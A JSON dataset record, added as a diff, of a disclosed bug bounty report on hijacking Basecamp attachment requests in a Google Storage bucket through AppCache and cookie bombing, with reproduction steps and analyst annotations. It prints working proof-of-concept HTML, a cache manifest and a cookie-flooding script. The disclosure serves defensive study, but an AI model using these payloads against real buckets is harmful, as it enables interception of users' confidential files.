@@ -1,0 +1,46 @@
+{
+    "reported_to": "Basecamp",
+    "reported_by": "hudmi ",
+    "title": "Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)",
+    "content": "\nBasecamp attachments are stored in the bc3_production_blobs bucket in the root directory and can be served with text/html content-type.\nhttps://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html\nSo with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker.\nTo know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/\nReproduction steps\nTo upload the files:\nLogin to 3.basecamp.com\nOpen campfire of any project\nUpload target files\nExtract direct links of them to Google Storage and remove response-content-disposition param\nI have uploaded 3 files by this way:\nCode 280 Bytes\n1<html manifest=\"[manifest_url]\">\n2This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.\n3<script>\n4setTimeout(function(){\n5for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};\n6}, 3000);\n7</script>\n8</html>\nCode 64 Bytes\n1CACHE MANIFEST \n2\n3FALLBACK:\n4/bc3_production_blobs/ [fallback_url]\nCode 99 Bytes\n1<html>\n2<script>\n3alert('Your request to the page '+location.href+' is hijacked!');\n4</script>\n5</html>\nPoC\nGo to http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/bc3attach and then try to open any direct link of bc3_production_blobs bucket. You will see alert popup with full url of this file.\nRefer to the video.\nImpact\nDirect links to any attachments can be hijacked and confedential files can be compromised\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": 500,
+    "weaknesses": [
+        "Business Logic Errors"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1606432800,
+    "report_url": "https://hackerone.com/reports/403602",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Login to 3.basecamp.com and open the campfire of any project."
+        ],
+        [
+            2,
+            "Upload an HTML file with a manifest attribute pointing to a malicious manifest file."
+        ],
+        [
+            3,
+            "Extract the direct link to the uploaded file in the bc3_production_blobs bucket and remove the response-content-disposition parameter."
+        ],
+        [
+            4,
+            "When a user visits the URL of the uploaded HTML file, their subsequent requests to the bucket will be hijacked due to the AppCache and CookieBombing trick."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to hijack user sessions by exploiting the AppCache and CookieBombing trick in the bc3_production_blobs bucket. By uploading a malicious HTML file and manipulating the content-type, the attacker can intercept and control subsequent requests to the bucket, potentially compromising confidential files.",
+    "reason": "This vulnerability involves multiple components (AppCache, CookieBombing, and bucket upload policies) and requires understanding subtle interactions between them. The attack also manipulates complex application states (browser cache and cookies) and uses a novel logic not commonly found in other applications.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
